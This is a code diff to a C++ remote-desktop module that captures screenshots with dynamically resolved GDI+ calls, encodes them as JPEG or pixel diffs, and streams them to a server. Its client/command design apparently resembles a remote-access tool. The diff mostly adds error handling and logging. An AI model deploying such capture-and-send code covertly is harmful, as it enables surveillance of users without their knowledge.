@@ -151,8 +151,8 @@ int mod_RemoteDesktop::BitmapDiff(GpBitmap*& _oldBitmap, GpBitmap*& _newBitmap, 
     }
 
     if (!this->GDIPLUS.pGdipBitmapLockBits || !this->GDIPLUS.pGdipBitmapUnlockBits ||
-        !this->GDIPLUS.pGdipGetImageWidth || this->GDIPLUS.pGdipGetImageHeight) {
-        __DBG_("Funciones de GDI no cargadas");
+        !this->GDIPLUS.pGdipGetImageWidth || !this->GDIPLUS.pGdipGetImageHeight) {
+        __DBG_("[RD][X] BitmapDiff Funciones de GDI no cargadas");
         return -1;
     }
 
@@ -161,7 +161,7 @@ int mod_RemoteDesktop::BitmapDiff(GpBitmap*& _oldBitmap, GpBitmap*& _newBitmap, 
 
     if(this->GDIPLUS.pGdipGetImageHeight((GpImage*)_oldBitmap, &height) != GpStatus::Ok ||
        this->GDIPLUS.pGdipGetImageWidth((GpImage*)_oldBitmap, &width) != GpStatus::Ok) {
-        __DBG_("Error al obtener dimensiones de _oldbitmap");
+        __DBG_("[RX][X] BitmapDiff Error al obtener dimensiones de _oldbitmap");
         return -1;
 	}
 
@@ -170,12 +170,12 @@ int mod_RemoteDesktop::BitmapDiff(GpBitmap*& _oldBitmap, GpBitmap*& _newBitmap, 
 
     if (this->GDIPLUS.pGdipGetImageHeight((GpImage*)_newBitmap, &n_height) != GpStatus::Ok ||
         this->GDIPLUS.pGdipGetImageWidth((GpImage*)_newBitmap, &n_width) != GpStatus::Ok) {
-        __DBG_("Error al obtener dimensiones de _newBitmap");
+        __DBG_("[RD][X] BitmapDiff Error al obtener dimensiones de _newBitmap");
         return -1;
     }
 
     if (width != n_width || height != n_height) {
-        __DBG_("Los bitmaps no son del mismo tamanio");
+        __DBG_("[RX][X] BitmapDiff Los bitmaps no son del mismo tamanio");
         return -1;
     }
 
@@ -255,6 +255,9 @@ mod_RemoteDesktop::mod_RemoteDesktop(st_User32_RD& _user32, st_Gdi32& _gdi32, st
 
     this->InitGDI();
     
+    if (this->OLE32.pCoInitialize) {
+        this->OLE32.pCoInitialize(NULL);
+    }
     mod_Instance_RD = this;
 
     return;
@@ -262,6 +265,9 @@ mod_RemoteDesktop::mod_RemoteDesktop(st_User32_RD& _user32, st_Gdi32& _gdi32, st
 
 mod_RemoteDesktop::~mod_RemoteDesktop() {
     this->StopGDI();
+    if (this->OLE32.pCoUninitialize) {
+        this->OLE32.pCoUninitialize();
+    }
     return;
 }
 
@@ -273,28 +279,24 @@ GpBitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int monitor_index) {
         !this->GDI32.pSelectObject || !this->GDI32.pGetObjectA || !this->GDI32.pBitBlt || !this->OLE32.pCreateStreamOnHGlobal ||
         !this->USER32.pGetWindowRect || !this->GDIPLUS.pGdipCreateBitmapFromHBITMAP ||
         !this->GDIPLUS.pGdipCreateBitmapFromStream ||
-        !this->GDI32.pDeleteDC || !this->GDI32.pDeleteObject) {
-        __DBG_("[RD][getFrameBitmap]No se cargaron todas las funciones");
+        !this->GDI32.pDeleteDC || !this->GDI32.pDeleteObject || !this->USER32.pGetDC || !this->USER32.pGetDesktopWindow) {
+        __DBG_("[RD][X][getFrameBitmap]No se cargaron todas las funciones");
         return outBitmap;
     }
 
     Monitor monitor = this->m_GetMonitor(monitor_index);
     if (monitor.rectData.resHeight == 0) {
-        __DBG_("[X] El monitor no es valido o no se ha obtenido al lista");
+        __DBG_("[RD][X] El monitor no es valido o no se ha obtenido al lista");
         return outBitmap;
     }
     
     if (!this->isGDIon) {
-        __DBG_("GDI no esta inicializado, init...");
+        __DBG_("[RD][!] GDI no esta inicializado, init...");
         this->InitGDI();
         if (!this->isGDIon) {
-            __DBG_("[X] No se pudo iniciar...");
+            __DBG_("[RD][X] No se pudo iniciar...");
             return outBitmap;
         }
-    }
-    
-    if (!this->USER32.pGetDC || !this->USER32.pGetDesktopWindow) {
-        return outBitmap;
     }
 
     HDC hdcMonitor = this->USER32.pGetDC(NULL);
@@ -319,34 +321,35 @@ GpBitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int monitor_index) {
     HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);
 
     if (hGlobalMem == NULL) {
+        error_2("[RD][X] getFrameBitmap GlobalAlloc error");
         goto EndSec;
     }
 
     if (!hdcMonitor) {
-        __DBG_("GetDC failed\n");
+        __DBG_("[RD][X] getFrameBitmap GetDC failed");
         goto EndSec;
     }
 
     hdcMemDC = this->GDI32.pCreateCompatibleDC(hdcMonitor);
     if (!hdcMemDC) {
-        __DBG_("GetcomtabielDC failed\n");
+        __DBG_("[RD][X] getFrameBitmap pCreateCompatibleDC failed");
         goto EndSec;
     }
 
     hmpScreen = this->GDI32.pCreateCompatibleBitmap(hdcMonitor, monitor.rectData.resWidth, monitor.rectData.resHeight);
     if (!hmpScreen) {
-        __DBG_("Createcompatiblebitmap failed\n");
+        __DBG_("[RD][X] getFrameBitmap Createcompatiblebitmap failed");
         goto EndSec;
     }
     
     if (!this->GDI32.pSelectObject(hdcMemDC, hmpScreen)) {
-        __DBG_("select object failed\n");
+        __DBG_("[RD][X] getFrameBitmap Select object failed");
         goto EndSec;
     }
     
     //Copiar los bits al bitmap   hmpScreen
     if (!this->GDI32.pBitBlt(hdcMemDC, 0, 0, monitor.rectData.resWidth, monitor.rectData.resHeight, hdcMonitor, monitor.rectData.xStart, monitor.rectData.yStart, SRCCOPY)) {
-        __DBG_("bitblt failed\n");
+        error_2("[RD][X] getFrameBitmap bitblt failed");
         goto EndSec;
     }
 
@@ -370,7 +373,7 @@ GpBitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int monitor_index) {
 
     hr = this->OLE32.pCreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
     if (hr != S_OK) {
-        __DBG_("CreateStreamOnHGlobal error\n");
+        error_2("[RD][X] getFrameBitmap CreateStreamOnHGlobal error");
         goto EndSec;
     }
 
@@ -386,24 +389,33 @@ GpBitmap* mod_RemoteDesktop::getFrameBitmap(ULONG quality, int monitor_index) {
     this->GetEncoderClsid(L"image/jpeg", &imageCLSID);
     
     //Crear el bitmap a partir del hbitmap capturado en hmpScreen
-    if (this->GDIPLUS.pGdipCreateBitmapFromHBITMAP(hmpScreen, NULL, &bmpBitmap) != GpStatus::Ok || !bmpBitmap) {
-        __DBG_("GdipCreateBitmapFromHBITMAP failed  or  bmpBitmap null");
+    if(this->GDIPLUS.pGdipCreateBitmapFromHBITMAP(hmpScreen, NULL, &bmpBitmap) != GpStatus::Ok || !bmpBitmap) {
+        __DBG_("[RD][X] getFrameBitmap GdipCreateBitmapFromHBITMAP failed  or  bmpBitmap null");
         goto EndSec;
     }
     
     //Guardar el bitmap al stream  oStream  en formato jpeg
-    if(this->GDIPLUS.pGdipSaveImageToStream(bmpBitmap, oStream, &imageCLSID, &encoderParams) != GpStatus::Ok) {
-		__DBG_("No se pudo guardar el buffer al stream");
+    if(this->GDIPLUS.pGdipSaveImageToStream(bmpBitmap, oStream, &imageCLSID, &encoderParams) != GpStatus::Ok){
+    	__DBG_("[RD][X] getFrameBitmap No se pudo guardar el buffer al stream");
         goto EndSec;
     }
 
+    //STATSTG stats = { 0 };
+    //hr = oStream->Stat(&stats, STATFLAG_NONAME);
+    //if (SUCCEEDED(hr)) {
+    //    LARGE_INTEGER liZero = { 0 };
+    //    ULARGE_INTEGER pos;
+    //    pStream->Seek(liZero, STREAM_SEEK_CUR, &pos);
+    //    wprintf(L"Stream size: %llu bytes, current pos: %llu\n", stats.cbSize.QuadPart, pos.QuadPart);
+    //}
     oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
 
     //Crear otro bitmap, esta vez con formato jpeg
-    GpStatus iret;
-    iret = this->GDIPLUS.pGdipCreateBitmapFromStream(oStream, &jpgBitmap);
-    if (jpgBitmap != nullptr) {
+    GpStatus gpRet = this->GDIPLUS.pGdipCreateBitmapFromStream(oStream, &jpgBitmap);
+    if (jpgBitmap != nullptr && gpRet == GpStatus::Ok) {
         outBitmap = jpgBitmap;
+    }else {
+        _DBG_("[RD][X] getFrameBitmap pGdipCreateBitmapFromStream error", gpRet);
     }
 
 EndSec:
@@ -432,7 +444,6 @@ EndSec:
 
 std::vector<char> mod_RemoteDesktop::getBitmapBytes(GpBitmap*& _in, ULONG _quality) {
     std::vector<char> vcOut;
-
     IStream* oStream = nullptr;
     HRESULT hr = S_OK;
     STATSTG statstg;
@@ -440,12 +451,13 @@ std::vector<char> mod_RemoteDesktop::getBitmapBytes(GpBitmap*& _in, ULONG _quali
     HGLOBAL hGlobalMem = GlobalAlloc(GHND | GMEM_DDESHARE, 0);
 
     if (hGlobalMem == NULL) {
+        error_2("[RD][X] getBitmapBytes GlobalAlloc error");
         goto EndSec;
     }
 
     hr = this->OLE32.pCreateStreamOnHGlobal(hGlobalMem, TRUE, &oStream);
     if (hr != S_OK) {
-        __DBG_("CreateStreamOnHGlobal error\n");
+        __DBG_("[RD][X] getBitmapBytes CreateStreamOnHGlobal error");
         goto EndSec;
     }
 
@@ -460,8 +472,12 @@ std::vector<char> mod_RemoteDesktop::getBitmapBytes(GpBitmap*& _in, ULONG _quali
 
     //Guardar imagen al stream oStream en formato jpeg
     this->GetEncoderClsid(L"image/jpeg", &imageCLSID);
-	this->GDIPLUS.pGdipSaveImageToStream(_in, oStream, &imageCLSID, &encoderParams);
-    
+	
+    if (this->GDIPLUS.pGdipSaveImageToStream(_in, oStream, &imageCLSID, &encoderParams) != GpStatus::Ok) {
+        __DBG_("[RD][X] getBitmapBytes pGdipSaveImageToStream error");
+        goto EndSec;
+    }
+
     //Leer todos lo bytes del stream
     hr = oStream->Stat(&statstg, STATFLAG_NONAME);
     if (hr == S_OK) {
@@ -472,6 +488,8 @@ std::vector<char> mod_RemoteDesktop::getBitmapBytes(GpBitmap*& _in, ULONG _quali
             oStream->Seek({ 0 }, STREAM_SEEK_SET, NULL);
             hr = oStream->Read(vcOut.data(), uiBuffsize, &bytes_read);
         }
+    }else {
+        __DBG_("[RD][X] getBitmapBytes oStream->Stat error");
     }
 
 EndSec:
@@ -539,12 +557,16 @@ void mod_RemoteDesktop::IniciarLive(ULONG quality, int monitor_index) {
 
         if (iDiff == -1) {     //Hubo un error o probablemente es la primera captura de pantalla
             if (newBitmap != nullptr) {
-                __DBG_("Asignando newBitmap a oldBitmap");
+                __DBG_("[RD][!]IniciarLive  Asignando newBitmap a oldBitmap");
                 
                 //Obtener dimensiones del nuevo bitmap
                 UINT n_width = 0, n_height = 0;
-                this->GDIPLUS.pGdipGetImageHeight(newBitmap, &n_height);
-                this->GDIPLUS.pGdipGetImageWidth(newBitmap, &n_width);
+                if (this->GDIPLUS.pGdipGetImageHeight(newBitmap, &n_height) != GpStatus::Ok ||
+                    this->GDIPLUS.pGdipGetImageWidth(newBitmap, &n_width) != GpStatus::Ok) {
+                    __DBG_("[RD][X] IniciarLive Error obteniendo dimenciones del nuevo bitmap")
+                    this->GDIPLUS.pGdipDisposeImage((GpImage*)newBitmap);
+                    continue;
+                }
                 
                 GpBitmap* copiaBitmap = nullptr;
                 GpBitmap* pGpBitmap = nullptr;
@@ -552,33 +574,40 @@ void mod_RemoteDesktop::IniciarLive(ULONG quality, int monitor_index) {
                 if (this->GDIPLUS.pGdipCreateBitmapFromScan0(n_width, n_height, 0, PixelFormat24bppRGB, nullptr, &pGpBitmap) == GpStatus::Ok && pGpBitmap) {
                     copiaBitmap = pGpBitmap;
                 }else {
-                    __DBG_("[X][IniciarLive] pGdipCreateBitmapFromScan0 error");
+                    __DBG_("[RD][X] IniciarLive pGdipCreateBitmapFromScan0 error");
                     this->GDIPLUS.pGdipDisposeImage((GpBitmap*)newBitmap);
                     break;
                 }
 
                 //Obtener formato de pixeles del bitmap actual  newBitmap
                 PixelFormat newPixelFormat = 0;
-                this->GDIPLUS.pGdipGetImagePixelFormat(newBitmap, &newPixelFormat);
                 
-                //Clonar bitmap a copiaBitmap y preservar la direccion de memoria en oldBitmap para futuras comparaciones
-                this->GDIPLUS.pGdipCloneBitmapAreaI(0, 0, n_width, n_height, newPixelFormat, newBitmap, &copiaBitmap);
-                oldBitmap = copiaBitmap;
-                
-                //Obtener bytes del newBitmap
-                std::vector<char> imgBuffer = this->getBitmapBytes(newBitmap, this->m_Quality());
-                int iSent = cCliente->cChunkSend(cCliente->sckSocket, imgBuffer.data(), imgBuffer.size(), 0, true, nullptr, EnumComandos::RD_Salida);
+                if (this->GDIPLUS.pGdipGetImagePixelFormat(newBitmap, &newPixelFormat) == GpStatus::Ok) {
+                    //Clonar bitmap a copiaBitmap y preservar la direccion de memoria en oldBitmap para futuras comparaciones
+                    if (this->GDIPLUS.pGdipCloneBitmapAreaI(0, 0, n_width, n_height, newPixelFormat, newBitmap, &copiaBitmap) == GpStatus::Ok) {
+                        oldBitmap = copiaBitmap;
+
+                        //Obtener bytes del newBitmap
+                        std::vector<char> imgBuffer = this->getBitmapBytes(newBitmap, this->m_Quality());
+                        int iSent = cCliente->cChunkSend(cCliente->sckSocket, imgBuffer.data(), imgBuffer.size(), 0, true, nullptr, EnumComandos::RD_Salida);
+                        if (iSent == -1) {
+                            __DBG_("[RD][X] IniciarLive error enviando el frame al servidor");
+                            break;
+                        }
+                    }else {
+                        __DBG_("[RD][X] IniciarLive pGdipCloneBitmapAreaI error");
+                    }
+                }else {
+                    __DBG_("[RD][X] IniciarLive pGdipGetImagePixelFormat error");
+                }
 
                 //Liberar bitmaps
-                this->GDIPLUS.pGdipDisposeImage((GpImage*)pGpBitmap);
-                this->GDIPLUS.pGdipDisposeImage((GpImage*)newBitmap);
-
-                if (iSent == -1) {
-                    __DBG_("[X][IniciarLive] error enviando el frame al servidor");
-                    break;
+                if (pGpBitmap) {
+                    this->GDIPLUS.pGdipDisposeImage((GpImage*)pGpBitmap);
                 }
+                this->GDIPLUS.pGdipDisposeImage((GpImage*)newBitmap);
             }else {
-                __DBG_("newBitmap es nulo");
+                __DBG_("[RD][X] IniciarLive newBitmap es nulo");
             }
         }else if (iDiff > 0) { 
             //Hubo un cambio en la nueva captura, enviar diferencia
@@ -594,6 +623,7 @@ void mod_RemoteDesktop::IniciarLive(ULONG quality, int monitor_index) {
                 this->pixelSerialize(vcPixels, vcData);
                 int iSent = cCliente->cChunkSend(cCliente->sckSocket, vcData.data(), vcData.size(), 0, true, nullptr, EnumComandos::RD_Salida_Pixel);
                 if (iSent == -1) {
+                    __DBG_("[RD][X] IniciarLive cChunkSend(Pixels): Error enviando el paquete al servidor")
                     break;
                 }
             }else {
@@ -601,6 +631,7 @@ void mod_RemoteDesktop::IniciarLive(ULONG quality, int monitor_index) {
                 std::vector<char> imgBuffer = this->getBitmapBytes(oldBitmap, this->m_Quality());
                 int iSent = cCliente->cChunkSend(cCliente->sckSocket, imgBuffer.data(), imgBuffer.size(), 0, true, nullptr, EnumComandos::RD_Salida);
                 if (iSent == -1) {
+                    __DBG_("[RD][X] IniciarLive cChunkSend(Full frame): Error enviando el paquete al servidor")
                     break;
                 }
             }
@@ -616,8 +647,8 @@ void mod_RemoteDesktop::IniciarLive(ULONG quality, int monitor_index) {
 }
 
 void mod_RemoteDesktop::EnviarCaptura(ULONG quality, int monitor_index) {
-    _DBG_("[RD] Enviando captura de pantalla. Index:", monitor_index);
-    _DBG_("[RD] Calidad:", quality);
+    _DBG_("[RD][!] Enviando captura de pantalla. Index:", monitor_index);
+    _DBG_("[RD][!] Calidad:", quality);
     
     GpBitmap* bitmapBits = this->getFrameBitmap(quality, monitor_index);
     if (bitmapBits != nullptr) {
@@ -626,19 +657,18 @@ void mod_RemoteDesktop::EnviarCaptura(ULONG quality, int monitor_index) {
         if (iBufferSize > 0) {
             int iRet = cCliente->cChunkSend(cCliente->sckSocket, vcDeskBuffer.data(), iBufferSize, 0, true, nullptr, EnumComandos::RD_Salida);
             if (iRet == -1) {
-                __DBG_("[RD] No se puedo enviar la captura de pantalla");
+                __DBG_("[RD][X] EnviarCaptura No se puedo enviar la captura de pantalla");
             }else {
-                __DBG_("[RD] Captura enviada")
+                __DBG_("[RD][X] EnviarCaptura Captura enviada")
             }
         }else {
-            __DBG_("[RD] El buffer de remote_desk es 0");
+            __DBG_("[RD][X] EnviarCaptura El buffer de remote_desk es 0");
         }
         this->GDIPLUS.pGdipDisposeImage((GpBitmap*)bitmapBits);
     }else {
-        __DBG_("[RD] Error obteniendo el frame");
+        __DBG_("[RD][X] EnviarCaptura Error obteniendo el frame");
     }
 }
-
 
 std::vector<Monitor> mod_RemoteDesktop::m_ListaMonitores() {
     this->m_Clear_Monitores();
